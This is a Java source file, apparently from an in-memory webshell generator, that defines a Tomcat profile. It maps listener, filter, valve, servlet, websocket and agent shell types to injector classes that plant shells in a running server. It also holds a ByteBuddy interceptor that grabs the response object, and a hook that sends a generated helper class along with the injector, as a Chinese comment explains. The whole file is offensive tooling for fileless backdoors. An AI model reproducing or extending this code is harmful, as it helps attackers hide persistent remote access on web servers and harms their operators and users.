package com.reajason.javaweb.memshell.server.tomcat;

import com.reajason.javaweb.memshell.server.AbstractServer;
import com.reajason.javaweb.memshell.server.InjectorMapping;
import com.reajason.javaweb.memshell.RawWsHelperNames;
import com.reajason.javaweb.memshell.config.InjectorConfig;
import com.reajason.javaweb.memshell.config.ShellConfig;
import com.reajason.javaweb.memshell.config.ShellToolConfig;

import com.reajason.javaweb.utils.ShellCommonUtil;
import net.bytebuddy.asm.Advice;

import static com.reajason.javaweb.memshell.ShellType.*;

/**
 * @author ReaJason
 * @since 2024/11/22
 */
public class Tomcat extends AbstractServer {

    public static class ListenerInterceptor {

        @Advice.OnMethodExit
        public static void enter(@Advice.Argument(0) Object request, @Advice.Return(readOnly = false) Object response) throws Exception {
            try {
                response = ShellCommonUtil.getFieldValue(ShellCommonUtil.getFieldValue(request, "request"), "response");
            } catch (Exception e) {
                response = ShellCommonUtil.getFieldValue(request, "response");
            }
        }
    }

    @Override
    public Class<?> getListenerInterceptor() {
        return ListenerInterceptor.class;
    }

    @Override
    public InjectorMapping getShellInjectorMapping() {
        return InjectorMapping.builder()
                .addInjector(LISTENER, "com.reajason.javaweb.memshell.injector.tomcat.TomcatListenerInjector")
                .addInjector(JAKARTA_LISTENER, "com.reajason.javaweb.memshell.injector.tomcat.TomcatListenerInjector")
                .addInjector(FILTER, "com.reajason.javaweb.memshell.injector.tomcat.TomcatFilterInjector")
                .addInjector(JAKARTA_FILTER, "com.reajason.javaweb.memshell.injector.tomcat.TomcatFilterInjector")
                .addInjector(VALVE, "com.reajason.javaweb.memshell.injector.tomcat.TomcatValveInjector")
                .addInjector(JAKARTA_VALVE, "com.reajason.javaweb.memshell.injector.tomcat.TomcatValveInjector")
                .addInjector(PROXY_VALVE, "com.reajason.javaweb.memshell.injector.tomcat.TomcatProxyValveInjector")
                .addInjector(JAKARTA_PROXY_VALVE, "com.reajason.javaweb.memshell.injector.tomcat.TomcatProxyValveInjector")
                .addInjector(SERVLET, "com.reajason.javaweb.memshell.injector.tomcat.TomcatServletInjector")
                .addInjector(JAKARTA_SERVLET, "com.reajason.javaweb.memshell.injector.tomcat.TomcatServletInjector")
                .addInjector(AGENT_FILTER_CHAIN, "com.reajason.javaweb.memshell.injector.tomcat.TomcatFilterChainAgentInjector")
                .addInjector(CATALINA_AGENT_CONTEXT_VALVE, "com.reajason.javaweb.memshell.injector.tomcat.TomcatContextValveAgentInjector")
                .addInjector(WEBSOCKET, "com.reajason.javaweb.memshell.injector.tomcat.TomcatWebSocketInjector")
                .addInjector(JAKARTA_WEBSOCKET, "com.reajason.javaweb.memshell.injector.tomcat.TomcatWebSocketInjector")
                .addInjector(RAW_WEBSOCKET, "com.reajason.javaweb.memshell.injector.tomcat.TomcatRawWsInjector")
                .addInjector(JAKARTA_RAW_WEBSOCKET, "com.reajason.javaweb.memshell.injector.tomcat.TomcatRawWsInjector")
                .addInjector(UPGRADE, "com.reajason.javaweb.memshell.injector.tomcat.TomcatUpgradeInjector")
                .build();
    }

    /**
     * RawWebSocket 需要按 shell 类名派生 helper 并随注入器下发；helper 在目标容器里
     * 由注入器先 defineClass，shell 构造时按名字自行解析。
     */
    @Override
    public byte[] postProcessShellBytes(byte[] shellBytes, ShellConfig shellConfig,
                                        ShellToolConfig shellToolConfig, InjectorConfig injectorConfig) {
        if (RAW_WEBSOCKET.equals(shellConfig.getShellType())
                || JAKARTA_RAW_WEBSOCKET.equals(shellConfig.getShellType())) {
            String helperClassName = RawWsHelperNames.helperClassName(shellToolConfig.getShellClassName());
            injectorConfig.setHelperClassBytes(TomcatRawWsHelperGenerator.getBytes(helperClassName, shellConfig));
        }
        return shellBytes;
    }
}
